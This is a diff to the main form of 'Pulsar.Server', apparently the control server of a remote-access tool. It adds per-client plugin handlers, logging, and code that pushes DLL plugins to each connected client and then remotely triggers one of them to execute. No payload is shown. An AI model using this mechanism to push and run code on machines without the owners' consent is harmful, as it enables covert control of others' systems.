@@ -20,6 +20,7 @@ using System.Linq;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using Pulsar.Common.Messages.QuickCommands;
 using System.IO;
@@ -46,14 +47,14 @@ namespace Pulsar.Server.Forms
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
         private readonly ClientStatusHandler _clientStatusHandler;
-        private readonly GetCryptoAddressHandler _getCryptoAddressHander;
-        private readonly ClientDebugLog _clientDebugLogHandler;
+        private readonly GetCryptoAddressHandler _getCryptoAddressHander;        private readonly ClientDebugLog _clientDebugLogHandler;
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object();        
         private PreviewHandler _previewImageHandler;
         private readonly string AutoTasksFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "autotasks.json");
-        private readonly ServerPluginManager _serverPluginManager;        
+        private readonly ServerPluginManager _serverPluginManager;
+        private readonly Dictionary<Client, Messages.PluginHandler> _clientPluginHandlers = new Dictionary<Client, Messages.PluginHandler>();
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
@@ -261,11 +262,28 @@ namespace Pulsar.Server.Forms
             {
                 lstClients.StretchColumnByIndex(hAccountType.Index);
             }
-        }
-
+        }       
+        
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
             SaveAutoTasks();
+
+            lock (_clientPluginHandlers)
+            {
+                foreach (var kvp in _clientPluginHandlers)
+                {
+                    try
+                    {
+                        MessageHandler.Unregister(kvp.Value);
+                        kvp.Value.Dispose();
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[PLUGIN HANDLER] Error disposing PluginHandler: {ex.Message}");
+                    }
+                }
+                _clientPluginHandlers.Clear();
+            }
 
             ListenServer.Disconnect();
             UnregisterMessageHandler();
@@ -479,6 +497,16 @@ namespace Pulsar.Server.Forms
             }
             else
             {
+                var pluginHandler = new Messages.PluginHandler(client, _serverPluginManager);
+                MessageHandler.Register(pluginHandler);
+                
+                lock (_clientPluginHandlers)
+                {
+                    _clientPluginHandlers[client] = pluginHandler;
+                }
+                
+                Console.WriteLine($"[PLUGIN HANDLER] Registered PluginHandler for client {client.Value?.Id ?? "unknown"}");
+                
                 lock (_clientConnections)
                 {
                     if (!ListenServer.Listening) return;
@@ -491,16 +519,25 @@ namespace Pulsar.Server.Forms
                     {
                         _processingClientConnections = true;
                         ThreadPool.QueueUserWorkItem(ProcessClientConnections);
-                    }
+                    }                
                 }
                 UpdateConnectedClientsCount();
-                
-                AutoDistributePlugins(client);
             }
-        }
-
+        }        
+        
         private void ClientDisconnected(Client client)
         {
+            lock (_clientPluginHandlers)
+            {
+                if (_clientPluginHandlers.TryGetValue(client, out var pluginHandler))
+                {
+                    MessageHandler.Unregister(pluginHandler);
+                    pluginHandler.Dispose();
+                    _clientPluginHandlers.Remove(client);
+                    Console.WriteLine($"[PLUGIN HANDLER] Unregistered and disposed PluginHandler for client {client.Value?.Id ?? "unknown"}");
+                }
+            }
+            
             lock (_clientConnections)
             {
                 if (!ListenServer.Listening) return;
@@ -1105,16 +1142,21 @@ namespace Pulsar.Server.Forms
         /// </summary>
         /// <param name="client">The client to distribute plugins to.</param>
         private void AutoDistributePlugins(Client client)
-        {
+        {            
             try
             {
                 var pluginDirectory = Path.Combine(Environment.CurrentDirectory, "Plugins", "Client");
+                Console.WriteLine($"[AUTO-DISTRIBUTE] Looking for client plugins in: {pluginDirectory}");
+                
                 if (!Directory.Exists(pluginDirectory))
                 {
+                    Console.WriteLine($"[AUTO-DISTRIBUTE] Plugin directory does not exist: {pluginDirectory}");
                     return;
                 }
 
                 var clientPluginFiles = Directory.GetFiles(pluginDirectory, "*.dll");
+                Console.WriteLine($"[AUTO-DISTRIBUTE] Found {clientPluginFiles.Length} DLL files");
+                
                 var distributedCount = 0;
 
                 foreach (var pluginFile in clientPluginFiles)
@@ -1122,6 +1164,8 @@ namespace Pulsar.Server.Forms
                     try
                     {
                         var pluginName = Path.GetFileNameWithoutExtension(pluginFile);
+                        Console.WriteLine($"[AUTO-DISTRIBUTE] Attempting to distribute plugin: {pluginName}");
+                        
                         var pluginBytes = _serverPluginManager.GetClientPluginBytes(pluginName);
                         
                         if (pluginBytes != null)
@@ -1129,20 +1173,57 @@ namespace Pulsar.Server.Forms
                             client.Send(new DoPluginDistribution
                             {
                                 PluginName = pluginName,
-                                PluginContent = pluginBytes
-                            });
+                                PluginContent = pluginBytes                            });
                             distributedCount++;
+                            Console.WriteLine($"[AUTO-DISTRIBUTE] Successfully distributed plugin: {pluginName}");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[AUTO-DISTRIBUTE] Failed to get bytes for plugin: {pluginName}");
                         }
                     }
                     catch (Exception ex)
                     {
                         EventLog($"Error distributing plugin {Path.GetFileNameWithoutExtension(pluginFile)}: {ex.Message}", "error");
+                        Console.WriteLine($"[AUTO-DISTRIBUTE ERROR] {ex.Message}");
                     }
-                }
-
+                }                
+                
                 if (distributedCount > 0)
                 {
                     EventLog($"Auto-distributed {distributedCount} client plugins to {client.Value?.Username ?? "Unknown"} ({client.EndPoint.Address})", "info");
+                    Console.WriteLine($"[AUTO-DISTRIBUTE] Distributed {distributedCount} plugins to client");
+                    
+                    Task.Run(async () =>
+                    {
+                        await Task.Delay(2000);
+                        
+                        try
+                        {
+                            Console.WriteLine($"[AUTO-START] Attempting to start ping-pong with client");
+                            
+                            var startMessage = "START";
+                            var startBytes = System.Text.Encoding.UTF8.GetBytes(startMessage);
+                              var workId = Guid.NewGuid().ToString();
+                            Console.WriteLine($"[AUTO-START] Sending START message to Pulsar.Plugin.Client plugin, WorkId: {workId}");
+                            
+                            client.Send(new DoPluginExecution
+                            {
+                                PluginName = "Pulsar.Plugin.Client",
+                                WorkId = workId,
+                                Type = PluginOperationType.Execute,
+                                Output = startBytes
+                            });
+                            
+                            EventLog($"Started ping-pong with {client.Value?.Username ?? "Unknown"}", "info");
+                            Console.WriteLine($"[AUTO-START] Successfully sent ping-pong start message");
+                        }
+                        catch (Exception ex)
+                        {
+                            EventLog($"Error starting ping-pong: {ex.Message}", "error");
+                            Console.WriteLine($"[AUTO-START ERROR] {ex.Message}");
+                        }
+                    });
                 }
             }
             catch (Exception ex)
